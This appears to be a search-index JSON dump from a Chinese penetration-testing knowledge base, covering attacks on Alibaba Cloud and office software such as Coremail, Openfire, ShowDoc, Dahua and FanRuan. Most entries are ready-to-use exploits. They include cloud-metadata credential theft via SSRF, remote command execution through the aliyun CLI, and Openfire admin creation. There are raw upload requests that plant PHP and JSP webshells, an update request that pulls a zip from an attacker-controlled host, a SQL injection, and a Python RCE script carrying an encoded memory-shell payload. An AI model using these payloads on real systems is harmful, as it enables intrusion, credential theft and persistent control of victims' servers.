100.100.100.200/latest/meta-data/ram/security-credentials/ram_username \u83b7\u53d6ak\u4fe1\u606f","title":"ssrf\u8bfb\u53d6\u7528\u6237\u6570\u636e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_5","text":"\u5728\u6211\u4eec\u83b7\u53d6ak\u540e\uff0c\u5229\u7528aliyun cli \u5373\u53ef\u5feb\u6377\u7684\u5728ecs\u91cc\u6267\u884c\u547d\u4ee4 aliyun ecs DescribeInstances \u83b7\u53d6\u6240\u6709ecs\u5b9e\u4f8b\u4fe1\u606f aliyun ecs RunCommand --InstanceId.1 i-2ze2sfmwdrs1z5xxoumk --RegionId cn-beijing --Type RunShellScript --CommandContent \"touch /tmp/UzJu\" \u6267\u884c\u547d\u4ee4","title":"\u547d\u4ee4\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#ram","text":"","title":"\u521b\u5efa\u6301\u4e45\u5316ram\u8d26\u53f7"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_6","text":"","title":"\u5229\u7528\u4e91\u51fd\u6570\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_7","text":"","title":"\u5229\u7528\u540e\u95e8\u955c\u50cf\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/","text":"\u529e\u516c\u7cfb\u7edf \u9488\u5bf9EXCHANGE\u7684\u653b\u51fb\u65b9\u5f0f jira Confluence \u6cdb\u5fae \u901a\u8fbe \u7985\u9053 \u5e7f\u8054\u8fbe \u84dd\u51cc smartbi \u5927\u534e \u7528\u53cb coremail \u81f4\u8fdc \u4e07\u6237 \u5e06\u8f6f \u91d1\u8776 openfire \u91d1\u548c showdoc","title":"\u529e\u516c\u7cfb\u7edf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/#_1","text":"\u9488\u5bf9EXCHANGE\u7684\u653b\u51fb\u65b9\u5f0f jira Confluence \u6cdb\u5fae \u901a\u8fbe \u7985\u9053 \u5e7f\u8054\u8fbe \u84dd\u51cc smartbi \u5927\u534e \u7528\u53cb coremail \u81f4\u8fdc \u4e07\u6237 \u5e06\u8f6f \u91d1\u8776 openfire \u91d1\u548c showdoc","title":"\u529e\u516c\u7cfb\u7edf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/","text":"coremail \u76ee\u5f55 \u6e17\u900f \u7248\u672c\u786e\u5b9a \u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u90ae\u7bb1\u7cfb\u7edf \u6e17\u900f \u7248\u672c\u786e\u5b9a \u654f\u611f\u4fe1\u606f\u6cc4\u9732 Coremail XT 3.0.1\u81f3XT 5.0.9\u7248\u672c\uff0cXT 5.0.9a\u53ca\u4ee5\u4e0a\u7248\u672c\u5df2\u4fee\u590d\u8be5\u6f0f\u6d1e http://mail.0-sec.org/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 Coremail <= XT5.x https://github.com/jimoyong/CoreMailUploadRce","title":"coremail"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/#coremail","text":"","title":"coremail"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/#_1","text":"\u6e17\u900f \u7248\u672c\u786e\u5b9a \u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u90ae\u7bb1\u7cfb\u7edf","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/#_2","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/#_3","text":"","title":"\u7248\u672c\u786e\u5b9a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/#_4","text":"Coremail XT 3.0.1\u81f3XT 5.0.9\u7248\u672c\uff0cXT 5.0.9a\u53ca\u4ee5\u4e0a\u7248\u672c\u5df2\u4fee\u590d\u8be5\u6f0f\u6d1e http://mail.0-sec.org/mailsms/s?func=ADMIN:appState&dumpConfig=/","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/coremail/coremail/#_5","text":"Coremail <= XT5.x https://github.com/jimoyong/CoreMailUploadRce","title":"\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/openfire/openfire/","text":"openfire \u76ee\u5f55 Openfire\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2023-32315) \u5373\u6642\u901a\u8a0a\uff08IM\uff09\u548c\u7fa4\u804a\u4f3a\u670d\u5668 Openfire\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2023-32315) GET /user-create.jsp?csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConfirm=Qwer1234&isadmin=on&create=............ HTTP/1.1","title":"openfire"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/openfire/openfire/#openfire","text":"","title":"openfire"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/openfire/openfire/#_1","text":"Openfire\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2023-32315) \u5373\u6642\u901a\u8a0a\uff08IM\uff09\u548c\u7fa4\u804a\u4f3a\u670d\u5668","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/openfire/openfire/#openfirecve-2023-32315","text":"GET /user-create.jsp?csrf=Sio3WOA89y2L9Rl&username=user1&name=&email=&password=Qwer1234&passwordConfirm=Qwer1234&isadmin=on&create=............ HTTP/1.1","title":"Openfire\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2023-32315)"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/showdoc/showdoc/","text":"showdoc \u76ee\u5f55 \u9ed8\u8ba4\u5bc6\u7801 \u6587\u4ef6\u4e0a\u4f20rce 1 \u6587\u4ef6\u4e0a\u4f20rce 2 ShowDoc\u662f\u4e00\u79cd\u5728\u7ebf\u6587\u6863\u7cfb\u7edf\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u56e2\u961f\u6216\u4e2a\u4eba\u5feb\u901f\u521b\u5efa\u3001\u5171\u4eab\u548c\u7ba1\u7406\u6587\u6863 \u9ed8\u8ba4\u5bc6\u7801 \u9ed8\u8ba4\u7528\u6237\u540dshowdoc\uff0c\u9ed8\u8ba4\u5bc6\u7801 123456 ) \u6587\u4ef6\u4e0a\u4f20rce 1 ShowDoc < V2.8.3 POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xxx.xxx.xxx.xxx:port User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Content-Length: 262 ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\" Content-Type: text/plain <?php echo '123_test';@eval($_GET[cmd])?> ----------------------------921378126371623762173617-- \u6587\u4ef6\u4e0a\u4f20rce 2 ShowDoc < V2.9.5 POST /server/index.php?s=/api/adminUpdate/download file_url=http://xxx.xxx.xxx:8888/showdoc-2.zip&new_version=2","title":"showdoc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/showdoc/showdoc/#showdoc","text":"","title":"showdoc"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/showdoc/showdoc/#_1","text":"\u9ed8\u8ba4\u5bc6\u7801 \u6587\u4ef6\u4e0a\u4f20rce 1 \u6587\u4ef6\u4e0a\u4f20rce 2 ShowDoc\u662f\u4e00\u79cd\u5728\u7ebf\u6587\u6863\u7cfb\u7edf\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u56e2\u961f\u6216\u4e2a\u4eba\u5feb\u901f\u521b\u5efa\u3001\u5171\u4eab\u548c\u7ba1\u7406\u6587\u6863","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/showdoc/showdoc/#_2","text":"\u9ed8\u8ba4\u7528\u6237\u540dshowdoc\uff0c\u9ed8\u8ba4\u5bc6\u7801 123456 )","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/showdoc/showdoc/#rce-1","text":"ShowDoc < V2.8.3 POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xxx.xxx.xxx.xxx:port User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Content-Length: 262 ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\" Content-Type: text/plain <?php echo '123_test';@eval($_GET[cmd])?> ----------------------------921378126371623762173617--","title":"\u6587\u4ef6\u4e0a\u4f20rce 1"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/showdoc/showdoc/#rce-2","text":"ShowDoc < V2.9.5 POST /server/index.php?s=/api/adminUpdate/download file_url=http://xxx.xxx.xxx:8888/showdoc-2.zip&new_version=2","title":"\u6587\u4ef6\u4e0a\u4f20rce 2"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/smartbi/smartbi/","text":"smartbi \u5546\u4e1a\u667a\u80fd\uff08Business Intelligence\uff09\u7cfb\u7edf\uff0c\u5b83\u63d0\u4f9b\u4e86 \u6570\u636e\u5206\u6790\u3001\u62a5\u8868\u751f\u6210\u3001\u6570\u636e\u53ef\u89c6\u5316 \u7b49\u529f\u80fd\u3002\u901a\u8fc7SmartBI\uff0c\u7528\u6237\u53ef\u4ee5\u4ece\u5404\u79cd\u6570\u636e\u6e90\u4e2d\u63d0\u53d6\u6570\u636e\uff0c\u5e76\u8fdb\u884c\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316\u5c55\u793a\u3002","title":"smartbi"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/smartbi/smartbi/#smartbi","text":"\u5546\u4e1a\u667a\u80fd\uff08Business Intelligence\uff09\u7cfb\u7edf\uff0c\u5b83\u63d0\u4f9b\u4e86 \u6570\u636e\u5206\u6790\u3001\u62a5\u8868\u751f\u6210\u3001\u6570\u636e\u53ef\u89c6\u5316 \u7b49\u529f\u80fd\u3002\u901a\u8fc7SmartBI\uff0c\u7528\u6237\u53ef\u4ee5\u4ece\u5404\u79cd\u6570\u636e\u6e90\u4e2d\u63d0\u53d6\u6570\u636e\uff0c\u5e76\u8fdb\u884c\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316\u5c55\u793a\u3002","title":"smartbi"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E4%B8%87%E6%88%B7/%E4%B8%87%E6%88%B7/","text":"\u4e07\u6237","title":"\u4e07\u6237"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E4%B8%87%E6%88%B7/%E4%B8%87%E6%88%B7/#_1","text":"","title":"\u4e07\u6237"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/","text":"\u5927\u534e \u76ee\u5f55 \u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 searchJson SQL\u6ce8\u5165\u6f0f\u6d1e POC \u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC \u5927\u534e\u667a\u6167\u56ed\u533a\u4efb\u610f\u5bc6\u7801\u8bfb\u53d6\u653b\u51fb \u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 searchJson SQL\u6ce8\u5165\u6f0f\u6d1e POC GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close \u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC POST /publishing/publishing/material/file/video HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 804 Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7 Accept-Encoding: gzip, deflate Connection: close --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Filedata\"; filename=\"0EaE10E7dF5F10C2.jsp\" <%@page contentType=\"text/html; charset=GBK\"%><%@page import=\"java.math.BigInteger\"%><%@page import=\"java.security.MessageDigest\"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%> --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"poc\" poc --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Submit\" submit --dd8f988919484abab3816881c55272a7-- \u5927\u534e\u667a\u6167\u56ed\u533a\u4efb\u610f\u5bc6\u7801\u8bfb\u53d6\u653b\u51fb GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1","title":"\u5927\u534e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/#_1","text":"","title":"\u5927\u534e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/#_2","text":"\u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 searchJson SQL\u6ce8\u5165\u6f0f\u6d1e POC \u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC \u5927\u534e\u667a\u6167\u56ed\u533a\u4efb\u610f\u5bc6\u7801\u8bfb\u53d6\u653b\u51fb","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/#searchjson-sql-poc","text":"GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close","title":"\u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 searchJson SQL\u6ce8\u5165\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/#poc","text":"POST /publishing/publishing/material/file/video HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 804 Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7 Accept-Encoding: gzip, deflate Connection: close --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Filedata\"; filename=\"0EaE10E7dF5F10C2.jsp\" <%@page contentType=\"text/html; charset=GBK\"%><%@page import=\"java.math.BigInteger\"%><%@page import=\"java.security.MessageDigest\"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance(\"MD5\");String s = \"123456\";String miyao = \"\";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%> --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"poc\" poc --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Submit\" submit --dd8f988919484abab3816881c55272a7--","title":"\u5927\u534e\u667a\u6167\u56ed\u533a\u7efc\u5408\u7ba1\u7406\u5e73\u53f0 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/#_3","text":"GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1","title":"\u5927\u534e\u667a\u6167\u56ed\u533a\u4efb\u610f\u5bc6\u7801\u8bfb\u53d6\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/","text":"\u5e06\u8f6f \u76ee\u5f55 \u67e5\u770b\u7248\u672c channel \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e v9 \u6587\u4ef6\u4e0a\u4f20 V8 get_geo_json \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u67e5\u770b\u7248\u672c /decision/system/info channel \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e python\u811a\u672c\uff0c\u5199\u5185\u5b58\u9a6c import base64 import requests payload = b\"H4sIAAAAAAAAAK1YS2wbVRS9z47jxE2aJun/m7Rpm/5m0qRp0ibQpvnVrfNRHVoUL8LL+CWeMJ6ZzrxJbRbsYMOmCCS2rGBBkSiL8lkAFVIlkLoAlQ0IxAKVDR+JbrqhcN+bsR2S1ElDLXnGvnPvefdz3r3PvvE7RFwH6ufoPFU8rhvKeepmRqgdiX5/+8vNL3wThtAQxAyLpoeoxi0nDtU84zA3YxnpnH3mLMjXtSq8hMQbwdo0K6vMOArP6E5asZxZJaNPM8eknCnMnNVNpri2rkzkbZa+TA2P1d99c+S3h1+9FYJQAio4yjkcSCCKOuOoEkVFFLWIogoVVdj3JCAyLyA4NCREDKpBzVl1bHqOabwnZ6M3x8p4I3CUfitrWyYzuQAce1X9qXbu5u4QrJ+EnZrDUG0wa/O81HJ1ztxBk04bLD0JDRnqjlp81DOMcceymcPzkxDR3YssH4caOxAlbWomoE6j5oA1mOMOZlG3TA6NC/w9Z1kGo2ZPCqIadTWaxng6U+Uy4OdRxTyq/b5FkucNkY96rRiPZxv6S+gDPFs2majG1KKV2r/YHkFj+FXn+RFLeHawHNpgURGjWTdnoZfpIca1DNqVjUgqBXa1heSN0ixzMVepBclKckc3Z1GrsaiFFaDTuoELcwilJhcAiJq6Ky1dolMKmguWkpnDzGQOFQXDVVF1VhdoHeXRZD4XmWMOq8UySc0S7O5alTv+jsu3TBQMe3IOHF2Jz33TrmSZsLr3yt3rb4/eJ7g1c7a/VYktdsXZcigiAKVICGXcmrOWkOILby5659HzNAQVCVhfVO43qIsZql9QLykS8Vs217M+IZ8pF/90njMNiSDZfYnNGExumbGCOWLV2NTB1YYZ5wKubDoLBVWppjHXlai+YQkouVYg31DUZeAJMloo0ZKsXm7+NvvB9VufhyDi95d+z+VWtk8uaDnuor6C/WJWOoAp7y5LyvJJ0E2XU9y4FOnGQV2Z3fEFBqJruWv3opBBn56eE0A8LpUFCMWHkJMkCIT2fRe98KudKJCdIM8vrAlqhPGMlY5nbaMlyRydGkOWk627+mHDJ78M/FVgvMkpNjdH0vsqvAwbUZpmmkFFe1oojWUlnOhl/x1TQSdLlIoqdIRVU86ed+C0cN71TOk3tamWYUqOoqmim1wEYSg51+CagmTKKRMM/cW4XOF39ZWx2+aN9zrCUBmH2indTCPLRr0sxh6H9VNoYLoG43GU51IQmyrsOSxhOJU6l4LKKc3fyg2pZfZyZMoseIoTZ8ryuO3xYAjKFrnZNxInCrUkxyoLmwPY0ZG3Y0usKtB7bhdfSIaDZckg+51s3LRialfDnddOF2sv1mnAVifuewWz/sEXAoroLv69bdPs7A9dBeUQykOpczcebHlYWTXxcyCuvP31o08/w8ftcCoGYdgbha4o7I/CAQIbXEmLy8h57EzPxQcIkAsEavstf2PI7h95v+mNB6//+OezBCp7dVPn+CHceugygYp+TDWBugQSyC/KhDhTEGSHpSEsUkh8D4QVGLpLoDHJvemJoHDjNC/OZARq4maBhAyVOhN51/KdU21fx/WrMEzTmHO3ZRmUHoLDSYhmkOYEnFa5h5F4cvv6xFMl8dQC8VRJPHVgbKQntax21ijp+v6I/qYmg49yKJ6nZtrAjStSUpW2NC+LJCVw7ImWR9OMj4Phn/v/zhCIDeY0ZguZG4WDBN55snys6EGaZ9WBiZG+nO7GuTgfYA99OjnUAzjBg7V4QSAa5JJA39PIZNLyHI0N6YLGNQEDFdEZaiAG66LQSqBjDYQl8vyyqoo4Ho6pLFOLp6IAicBG2aF0q+S83G2nVotcQCqyhcCeFWLBEvVqRtAK6ktt9ZLvZBQOY85QMfhOYFProcQStZ4aOArHYnAEFAJHbBwhTRnO7dOq6jmG0t55qiNN2QybVnR7/qRy/ERHh8I80TmroA27CcsxjcDB1qWDaOFa2JbFUMS12qFDrHUC21uSU+1F/HEYNKbdpXDHr2EXOt7R1nb8BK7f1t3V1tVOcDiU1+iBZvzVGAb0Ct/bIQKVeI/K35JVUoYswWsNSlS8E7xHDn8E5KZUqcVrpRSqsB6vNb4C1EG3GAHQCBtRSxifwXdYyBYbnpCGTf7DwFB82gSb5XMCW2ArWmzDz76PAnZHABuX0mVguyXsYf/hsrA7YZf8wYxZhD24fGmBKjhUDLoFnwitunchTBIfg9pw/BZ0XrkpDU/KoIjQaJLrN0M93mP4KAT7YANUe2L6Kah7rzjKdohRtikKW6KwNQrbVjvKrt7X/+jNDm99OqMsPGRZS0bX/hVHF1qtpqlsJ7BvFVAY+uJ/DB7bFFba2GV5TFbP495FPG6QzxvldeOC6m4W1bXxwIS7yrGvEciJSkfkaSckjz7ickRc2nP/AmooaxnkEQAA\" b64_payload = base64.b64decode(payload) # proxies = {'http': 'http://localhost:8899', 'https': 'http://localhost:8899'} header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*' } post_payload = b64_payload res = requests.post(\"http://aaa.com/webroot/decision/;/remote/design/channel\",data = post_payload,headers=header,verify=False) print(res.status_code) # with open(\"result.txt\", \"a\") as o: # o.write(res.text) print(res.text) http://a.com/webroot/faviconjs.css?filename=1&cmd=whoami v9 \u6587\u4ef6\u4e0a\u4f20 POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"<%out.println(\\\"Hello World!\\\");%>\",\"__CHARSET__\":\"UTF-8\"} V8 get_geo_json \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u8bfb\u5bc6\u7801 